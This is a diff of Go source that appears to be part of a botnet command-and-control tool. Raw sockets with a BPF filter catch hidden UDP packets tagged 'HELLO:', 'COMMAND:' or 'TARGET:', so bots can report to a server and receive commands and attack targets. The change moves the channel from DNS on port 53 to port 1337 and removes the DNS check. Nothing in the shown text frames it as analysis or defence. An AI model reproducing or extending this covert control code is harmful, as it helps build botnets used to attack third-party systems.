@@ -19,7 +19,7 @@ import (
 )
 
 // FilterRaw is a BPF struct containing raw instructions.
-// Generate with tcpdump udp and port 53 -dd
+// Generate with tcpdump udp and port 1337 -dd
 // or whatever filter you would like to generate
 var FilterRaw = []bpf.RawInstruction{
 	{0x28, 0, 0, 0x0000000c},
@@ -27,9 +27,9 @@ var FilterRaw = []bpf.RawInstruction{
 	{0x30, 0, 0, 0x00000014},
 	{0x15, 0, 15, 0x00000011},
 	{0x28, 0, 0, 0x00000036},
-	{0x15, 12, 0, 0x00000035},
+	{0x15, 12, 0, 0x00000539},
 	{0x28, 0, 0, 0x00000038},
-	{0x15, 10, 11, 0x00000035},
+	{0x15, 10, 11, 0x00000539},
 	{0x15, 0, 10, 0x00000800},
 	{0x30, 0, 0, 0x00000017},
 	{0x15, 0, 8, 0x00000011},
@@ -37,9 +37,9 @@ var FilterRaw = []bpf.RawInstruction{
 	{0x45, 6, 0, 0x00001fff},
 	{0xb1, 0, 0, 0x0000000e},
 	{0x48, 0, 0, 0x0000000e},
-	{0x15, 2, 0, 0x00000035},
+	{0x15, 2, 0, 0x00000539},
 	{0x48, 0, 0, 0x00000010},
-	{0x15, 0, 1, 0x00000035},
+	{0x15, 0, 1, 0x00000539},
 	{0x6, 0, 0, 0x00040000},
 	{0x6, 0, 0, 0x00000000},
 }
@@ -90,11 +90,9 @@ func ServerReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 	// Parse packet... hopefully
 	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
 	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
-		if dns := packet.Layer(layers.LayerTypeDNS); dns != nil {
-			// Make sure this is my packet
-			if strings.Contains(string(packet.ApplicationLayer().Payload()), "HELLO:") {
-				return packet
-			}
+		// Make sure this is my packet
+		if strings.Contains(string(packet.ApplicationLayer().Payload()), "HELLO:") {
+			return packet
 		}
 		return nil
 	}
@@ -134,13 +132,11 @@ func BotReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, bool) {
 	// Parse packet... hopefully
 	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
 	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
-		if dns := packet.Layer(layers.LayerTypeDNS); dns != nil {
-			// Make sure this is my packet
-			if strings.Contains(string(packet.ApplicationLayer().Payload()), "COMMAND:") {
-				return packet, false
-			} else if strings.Contains(string(packet.ApplicationLayer().Payload()), "TARGET:") {
-				return packet, true
-			}
+		// Make sure this is my packet
+		if strings.Contains(string(packet.ApplicationLayer().Payload()), "COMMAND:") {
+			return packet, false
+		} else if strings.Contains(string(packet.ApplicationLayer().Payload()), "TARGET:") {
+			return packet, true
 		}
 		return nil, false
 	}
